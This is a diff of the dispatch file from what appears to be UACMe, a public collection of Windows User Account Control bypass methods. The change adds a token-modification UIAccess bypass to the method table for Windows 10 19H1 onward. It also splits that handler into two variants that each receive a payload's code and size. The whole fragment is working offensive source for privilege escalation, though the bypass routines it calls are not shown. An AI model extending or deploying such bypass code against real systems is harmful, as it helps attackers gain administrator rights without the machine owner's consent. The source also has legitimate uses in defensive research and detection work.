@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2023
+*  (C) COPYRIGHT AUTHORS, 2015 - 2024
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.65
+*  VERSION:     3.66
 *
-*  DATE:        22 Sep 2023
+*  DATE:        03 Apr 2024
 *
 *  UAC bypass dispatch.
 *
@@ -149,7 +149,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
     { MethodIscsiCpl, { NT_WIN7_RTM, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
     { MethodAtlHijack, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodSspiDatagram, { NT_WIN7_RTM, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE }
+    { MethodSspiDatagram, { NT_WIN7_RTM, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
+    { MethodTokenModUIAccess, { NT_WIN10_19H1, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -582,8 +583,14 @@ UCM_API(MethodShellSdctl)
 
 UCM_API(MethodTokenModUIAccess)
 {
-    return ucmTokenModUIAccessMethod(Parameter->PayloadCode,
-        Parameter->PayloadSize);
+    if (Parameter->Method == UacMethodTokenModUiAccess) {
+        return ucmTokenModUIAccessMethod(Parameter->PayloadCode,
+            Parameter->PayloadSize);
+    }
+    else {
+        return ucmTokenModUIAccessMethod2(Parameter->PayloadCode,
+            Parameter->PayloadSize);
+    }
 }
 
 UCM_API(MethodEditionUpgradeManager)
